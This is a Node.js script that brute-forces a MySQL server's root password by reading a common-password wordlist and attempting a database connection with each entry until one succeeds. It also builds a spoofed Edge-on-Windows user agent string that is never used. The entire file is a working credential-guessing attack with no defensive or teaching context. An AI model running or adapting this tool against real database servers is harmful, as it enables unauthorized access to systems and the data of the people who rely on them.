var fileModule = require('fs');
var mysql      = require('mysql');
const { exit } = require('process');

const UserAgent = require('user-agents');
const userAgent = new UserAgent([
  /Edg/,
  {
    platform: 'Win32',
  }
]);
console.log(userAgent.toString());

let passwordFound = '';
let fileName = "top-100.txt";
let fileNameWithPath = "assets/passwords/"+fileName;
var dbHostName = "localhost";
var dbUserName = "root"; // admin/root

var startIndexFileWithPath = "assets/startindex/startindex.txt";
fileModule.readFile(startIndexFileWithPath, 'utf8', function(err, dataFromStartIndexFile) {
  if (err) throw err;
  startindex = parseInt(dataFromStartIndexFile);
});

fileModule.readFile(fileNameWithPath, 'utf8', async function(err, data) {
  if (err) throw err; //console.log(data);

  let dataArray = data.split("\n");
  for(let i=0; i<dataArray.length; i++)
  {
    let thisPassword = dataArray[i].toString();
    let resultOfPassCheck = await checkPassword(thisPassword);

    console.log(resultOfPassCheck+"\t=>\t"+thisPassword);
    if(resultOfPassCheck == 1){
      passwordFound = thisPassword;
      return;
    }
  }

});


async function checkPassword(thisPassword)
{
  let thisResult = new Promise(function(resolve, reject) {
                try{
                    let dbConnection = mysql.createConnection({
                      host     : dbHostName,
                      user     : dbUserName,
                      password : thisPassword
                    });
                
                    dbConnection.connect(function(connectionErr) {
                      if (!connectionErr) {
                        //console.log(thisPassword);
                        resolve(1);
                      }
                      else{
                        dbConnection.end();
                        resolve(0);
                      }
                    });
                  }
                  catch(e){
                      resolve(-1);
                  }
              });
  return thisResult;
}

process.on('uncaughtException', err => {
  console.error('There was an uncaught error', err)
  process.exit(1)
})